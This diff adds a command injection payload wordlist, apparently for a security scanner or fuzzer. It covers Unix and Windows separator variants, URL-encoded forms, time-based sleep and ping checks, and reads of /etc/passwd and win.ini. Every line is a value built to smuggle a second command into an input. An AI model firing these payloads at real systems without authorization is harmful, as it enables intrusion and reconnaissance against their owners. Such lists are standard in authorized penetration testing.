@@ -1,0 +1,49 @@
+# Command Injection payloads
+# Basic command injection
+;id
+;whoami
+;uname -a
+;cat /etc/passwd
+| id
+| whoami
+| uname -a
+|| id
+|| whoami
+& id
+& whoami
+&& id
+&& whoami
+`id`
+`whoami`
+$(id)
+$(whoami)
+
+# With URL encoding
+%3Bid
+%3Bwhoami
+%7Cid
+%7Cwhoami
+
+# Windows commands
+;ipconfig
+| ipconfig
+& ipconfig
+&& ipconfig
+;dir
+| dir
+& dir
+&& dir
+;type C:\windows\win.ini
+| type C:\windows\win.ini
+
+# Time-based detection
+;sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+;ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# Command substitution
+$(cat /etc/passwd)
+`cat /etc/passwd`
